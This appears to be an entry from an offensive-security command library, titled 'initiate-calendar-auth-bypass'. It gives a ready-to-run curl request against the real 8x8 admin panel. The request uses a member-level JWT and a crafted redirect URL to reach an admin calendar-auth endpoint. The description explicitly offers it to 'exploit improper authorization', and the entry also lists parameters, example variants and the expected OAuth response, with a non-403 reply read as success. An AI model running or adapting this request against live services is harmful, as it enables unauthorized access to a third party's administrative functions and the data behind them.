---
data: >-
  curl -X GET
  "https://admin.8x8.vc/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd"
  -H "Authorization: Bearer <member-jwt-token>" -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" -H
  "Accept: */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip,
  deflate" -H "Referer: https://admin.8x8.vc/" -H "Content-Type:
  application/json" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: cors" -H
  "Sec-Fetch-Site: same-origin" -H "Te: trailers" -H "Connection: close"
tags:
  - http-request
  - bypass
  - oauth
type: command
output: >-
  {"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=...&avoid_linking=true"}
executor: bash
platforms:
  - Web
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.084Z'
id: 7c3e83a1-888b-4968-8805-001473272d98
verified: false
validated: true
submitted: true
---
# initiate-calendar-auth-bypass

## Command

```bash
curl -X GET "https://admin.8x8.vc/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd" -H "Authorization: Bearer <member-jwt-token>" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" -H "Accept: */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: https://admin.8x8.vc/" -H "Content-Type: application/json" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Site: same-origin" -H "Te: trailers" -H "Connection: close"
```

## Description

This curl command initiates the calendar authentication process on the 8x8 admin panel using a member user's JWT token, with a crafted successRedirectUrl to bypass access controls and target the admin rooms add page. Use it to exploit improper authorization in web sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `successRedirectUrl` | URL-encoded redirect after OAuth (e.g., https://admin.8x8.vc/#/rooms/add) | Yes |
| `Authorization` | Bearer token with member JWT | Yes |
| `User-Agent` | Browser-like header to mimic legitimate request | Yes |
| `Referer` | Origin header set to admin.8x8.vc | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://admin.8x8.vc/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd" -H "Authorization: Bearer eyJ..." -H "User-Agent: Mozilla/5.0..."
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X GET "https://admin.8x8.vc/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd" -H "Authorization: Bearer <jwt>" -H "User-Agent: Mozilla/5.0..."
```

## Expected Output

JSON response with OAuth URL: {"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=...&avoid_linking=true"}. Indicates successful bypass if no 403 error.

## Related

- [[Related Procedure: Initiate-Calendar-Auth-Bypass-as-Member]]
